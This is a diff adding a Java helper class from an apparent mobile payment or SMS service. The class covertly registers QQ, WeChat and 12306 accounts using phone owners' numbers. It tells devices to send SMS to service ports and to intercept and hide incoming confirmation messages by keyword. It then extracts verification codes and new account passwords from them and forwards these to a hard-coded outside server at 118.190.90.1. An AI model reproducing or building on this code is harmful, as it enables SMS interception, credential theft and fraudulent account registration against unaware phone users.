@@ -1,0 +1,339 @@
+package com.klw.fastfun.pay.view.app.http;
+
+import java.net.URLEncoder;
+
+import org.apache.log4j.Logger;
+
+import com.alibaba.fastjson.JSONObject;
+import com.juice.orange.game.log.LoggerFactory;
+import com.klw.fastfun.pay.common.domain.OrderReqInfo;
+import com.klw.fastfun.pay.common.domain.RegisterRes;
+import com.klw.fastfun.pay.common.tool.ConstantDefine;
+import com.klw.fastfun.pay.common.tool.HttpTool;
+
+public class RegisterReqHelper {
+	
+	private static Logger logger = LoggerFactory.getLogger(RegisterReqHelper.class);
+	
+	
+	public static OrderReqInfo getSMSRegister(OrderReqInfo info) {
+		switch (info.getUrlNo()) {
+		case ConstantDefine.URL_NO_SD07_JSON:
+			return getOnlineSMS48(info);
+		case ConstantDefine.URL_NO_SD15_JSON:
+			return getOnlineSMS53(info);
+		case ConstantDefine.URL_NO_SD17_JSON:
+			return getOnlineSMS55(info);
+		case ConstantDefine.URL_NO_SD18_JSON:
+			return getOnlineSMS57(info);
+		case ConstantDefine.URL_NO_SD64_JSON:
+			return getOnlineSMS123(info);
+		default:
+			break;
+		}
+		return null;
+	}
+	
+
+	public static void main(String[] args) {
+		String s = "ok|3568db56021d4663";
+		String[] ss = s.split("\\|");
+		System.out.println(ss[1]);
+		System.out.println(ss.length);
+	}
+	private static OrderReqInfo getOnlineSMS123(OrderReqInfo info) {
+		try  {
+			
+			String url = info.getUrl();
+			String keyword = info.getKeyword();
+			
+			RegisterRes reg = new RegisterRes();
+			reg.setOrderid(info.getFfId());
+			reg.setStatus("0");//0为成功其他为失败
+			
+			String reqkey = HttpTool.sendGetSetTimeout(url, "m=Lua.getRand","2000");
+			String[] reqkeyarr = reqkey.split("\\|");
+			if (reqkeyarr.length == 2) {
+				String key = reqkeyarr[1];
+				info.setPmodel(key);
+				String reqtokenparam = "m=Lua.getUserToken&" + keyword;
+				String reqtoken = HttpTool.sendGetSetTimeout(url, reqtokenparam,"2000");
+				String[] reqtokenarr = reqtoken.split("\\|");
+				if (reqtokenarr.length == 2) {
+					String token = reqtokenarr[1];
+					StringBuilder param = new StringBuilder();
+					param.append("m=Lua.chuanImgByPost2")
+					.append("&token=").append(token)
+					.append("&phone=").append(info.getMobile())
+					.append("&key=").append(key)
+					.append("&img=").append(info.getFfId() + ".jpg");
+					String requrl = url + "?" + param.toString();
+					reg.setUrl(requrl);
+					
+					StringBuilder resparam = new StringBuilder();
+					resparam.append("m=Lua.setImg")
+					.append("&key=").append(key)
+					.append("&token=").append(token)
+					.append("&status=");
+					info.setCtech(url + "?" + resparam.toString());
+				} else {
+					reg.setStatus("2");//1获取token失败
+				}
+			} else {
+				reg.setStatus("1");//1获取key失败
+			}
+			
+			
+			info.setReg(reg);
+			
+		} catch (Exception e) {
+			logger.error("sd18指令失败!");
+			logger.error(e.getMessage(), e.getCause());
+		}
+		
+		return info;
+		
+	}
+	
+	private static OrderReqInfo getOnlineSMS57(OrderReqInfo info) {
+		try  {
+			
+			String url = info.getUrl();
+			String reqNum = info.getNum();
+			
+			RegisterRes reg = new RegisterRes();
+			reg.setOrderid(info.getFfId());
+			reg.setStatus("0");//0为成功其他为失败
+			reg.setDelaytime("1");//延迟时间秒为单位
+			
+			StringBuilder param = new StringBuilder();
+			param.append("phone=").append(info.getMobile())
+			.append("&cpparam=").append(info.getFfId());
+			if ("1".equals(reqNum)) {
+				String smscontent = info.getSmscontent();
+				String[] arr = smscontent.split("。请勿");
+				String[] arr1 = arr[0].split("验证码");
+				info.setCode(arr1[1]);
+				
+				url = info.getKeyword();
+				param.append("&order_id=").append(info.getOrderId())
+				.append("&code=").append(info.getCode())
+				.append("&action=submit_sms");
+				
+				reg.setIsscreen("0");
+				reg.setSendtype("2");
+			} else {
+				param.append("&action=submit_phone");
+				
+				String resUrl = getCommitUrl(info);
+				
+				reg.setIsscreen("1");//0:无需拦截下行1:需要拦截下行
+				reg.setKeyword("注册微信");//拦截关键字，模糊匹配
+				reg.setKeyport("106");//拦截端口号，模糊匹配
+				reg.setIsreply("0");//1需要回复，0无需回复
+				reg.setUrl(resUrl);
+				reg.setSendtype("2");//0:直接发送1:需要64位解码后发送2：无需发送短信
+			}
+			
+			String reqResult = HttpTool.sendGetSetTimeout(url, param.toString(),"1000");
+			logger.info("sd18请求url=>"+url);
+			logger.info("sd18请求param=>"+param.toString());
+			logger.info("sd18请求结果=>"+reqResult);
+			
+			if (reqResult != null) {
+				JSONObject jsonObj = JSONObject.parseObject(reqResult);
+				String status = jsonObj.getString("code");
+				if ("0".equals(reqNum) && !"1".equals(status)) {
+					reg.setStatus("2");
+				} else {
+					if (!"1".equals(status)) {
+						reg.setStatus("2");
+					}
+				}
+			} else {
+				reg.setStatus("2");
+			}
+			
+			info.setReg(reg);
+			
+		} catch (Exception e) {
+			logger.error("sd18指令失败!");
+			logger.error(e.getMessage(), e.getCause());
+		}
+		
+		return info;
+		
+	}
+	
+	private static OrderReqInfo getOnlineSMS55(OrderReqInfo info) {
+		try  {
+			
+			String url = info.getUrl();
+			String reqNum = info.getNum();
+			String keyword = info.getKeyword();
+			
+			RegisterRes reg = new RegisterRes();
+			reg.setOrderid(info.getFfId());
+			reg.setStatus("0");//0为成功其他为失败
+			reg.setDelaytime("1");//延迟时间秒为单位
+			if ("1".equals(reqNum)) {
+				
+				String smscontent = info.getSmscontent();
+				String[] arr = smscontent.split("。如非本人");
+				String[] arr1 = arr[0].split("验证码：");
+				info.setCode(arr1[1]);
+				
+				StringBuilder param = new StringBuilder();
+				param.append(keyword)
+				.append("&smsContent=").append(info.getCode())
+				.append("&mobile=").append(info.getMobile())
+				.append("&ccpara=").append(info.getFfId());
+				
+				String reqResult = HttpTool.sendGetSetTimeout(url, param.toString(),"1000");
+				logger.info("12306注册sd17请求url=>"+url);
+				logger.info("12306注册sd17请求param=>"+param.toString());
+				logger.info("12306注册sd17请求结果=>"+reqResult);
+				if (reqResult != null && reqResult.length() > 0) {
+					JSONObject jsonobj = JSONObject.parseObject(reqResult);
+					String errNo = jsonobj.getString("errNo");
+					reg.setStatus(errNo);
+				}
+				
+				reg.setIsscreen("0");
+				reg.setSendtype("2");
+			} else {
+				String resUrl = getCommitUrl(info);
+				
+				reg.setIsscreen("1");//0:无需拦截下行1:需要拦截下行
+				reg.setKeyword("12306用户注册");//拦截关键字，模糊匹配
+				reg.setKeyport("12306");//拦截端口号，模糊匹配
+				reg.setIsreply("0");//1需要回复，0无需回复
+				reg.setUrl(resUrl);
+				reg.setSendtype("0");//0:直接发送1:需要64位解码后发送2：无需发送短信
+				reg.setSms("999");//发送内容
+				reg.setSmsport("12306");//发送端口号
+			}
+			info.setReg(reg);
+			
+		} catch (Exception e) {
+			logger.error("12306注册sd17指令失败!");
+			logger.error(e.getMessage(), e.getCause());
+		}
+		
+		return info;
+		
+	}
+	
+
+	private static OrderReqInfo getOnlineSMS53(OrderReqInfo info) {
+		try  {
+			
+//			String url = info.getUrl();
+			String reqNum = info.getNum();
+			
+			RegisterRes reg = new RegisterRes();
+			reg.setOrderid(info.getFfId());
+			reg.setStatus("0");//0为成功其他为失败
+			reg.setDelaytime("1");//延迟时间秒为单位
+			if ("1".equals(reqNum)) {
+				
+				String smscontent = info.getSmscontent();
+				String[] arr = smscontent.split(",密码");
+				String[] arr1 = arr[0].split("获得QQ号");
+				String[] arr2 = arr[1].split("。已开通");
+				info.setUsername(arr1[1]);
+				info.setPassword(arr2[0]);
+				
+				reg.setIsscreen("0");
+				reg.setSendtype("2");
+			} else {
+				String resUrl = getCommitUrl(info);
+				
+				reg.setIsscreen("1");//0:无需拦截下行1:需要拦截下行
+				reg.setKeyword("获得QQ号");//拦截关键字，模糊匹配
+				reg.setKeyport("106");//拦截端口号，模糊匹配
+				reg.setIsreply("0");//1需要回复，0无需回复
+				reg.setUrl(resUrl);
+				reg.setSendtype("0");//0:直接发送1:需要64位解码后发送2：无需发送短信
+				reg.setSms("ZC");//发送内容
+				reg.setSmsport("10690700511");//发送端口号
+			}
+			info.setReg(reg);
+			
+		} catch (Exception e) {
+			logger.error("QQ注册sd07指令失败!");
+			logger.error(e.getMessage(), e.getCause());
+		}
+		
+		return info;
+		
+	}
+	
+	private static OrderReqInfo getOnlineSMS48(OrderReqInfo info) {
+		try  {
+			
+			String url = info.getUrl();
+			String reqNum = info.getNum();
+			
+			RegisterRes reg = new RegisterRes();
+			reg.setOrderid(info.getFfId());
+			reg.setStatus("0");//0为成功其他为失败
+			reg.setDelaytime("1");//延迟时间秒为单位
+			if ("1".equals(reqNum)) {
+				
+				String smscontent = info.getSmscontent();
+				String[] arr = smscontent.split(",密码");
+				String[] arr1 = arr[0].split("获得QQ号");
+				String[] arr2 = arr[1].split("。已开通");
+				info.setUsername(arr1[1]);
+				info.setPassword(arr2[0]);
+				
+				StringBuilder param = new StringBuilder();
+				param.append("cid=qq119&pid=p119&username=").append(info.getUsername())
+				.append("&passwd=").append(info.getPassword())
+				.append("&mobile=").append(info.getMobile())
+				.append("&ccpara=").append(info.getFfId());
+				
+				String reqResult = HttpTool.sendGetSetTimeout(url, param.toString(),"1000");
+				logger.info("QQ注册sd07请求url=>"+url);
+				logger.info("QQ注册sd07请求param=>"+param.toString());
+				logger.info("QQ注册sd07请求结果=>"+reqResult);
+				
+				reg.setIsscreen("0");
+				reg.setSendtype("2");
+			} else {
+				String resUrl = getCommitUrl(info);
+				
+				reg.setIsscreen("1");//0:无需拦截下行1:需要拦截下行
+				reg.setKeyword("获得QQ号");//拦截关键字，模糊匹配
+				reg.setKeyport("106");//拦截端口号，模糊匹配
+				reg.setIsreply("0");//1需要回复，0无需回复
+				reg.setUrl(resUrl);
+				reg.setSendtype("0");//0:直接发送1:需要64位解码后发送2：无需发送短信
+				reg.setSms("ZC");//发送内容
+				reg.setSmsport("10690700511");//发送端口号
+			}
+			info.setReg(reg);
+			
+		} catch (Exception e) {
+			logger.error("QQ注册sd07指令失败!");
+			logger.error(e.getMessage(), e.getCause());
+		}
+		
+		return info;
+		
+	}
+	
+	private static String getCommitUrl(OrderReqInfo info) {
+		StringBuilder resUrl = new StringBuilder();
+		resUrl.append("http://118.190.90.1/code/commitRegister?")
+		.append("cpid=").append(info.getCpId())
+		.append("&num=").append("1")
+		.append("&phone=").append(info.getMobile())
+		.append("&cpparam=").append(info.getCpParam())
+		.append("&orderid=").append(info.getFfId())
+		.append("&smscontent=");
+		return resUrl.toString();
+	}
+
+}
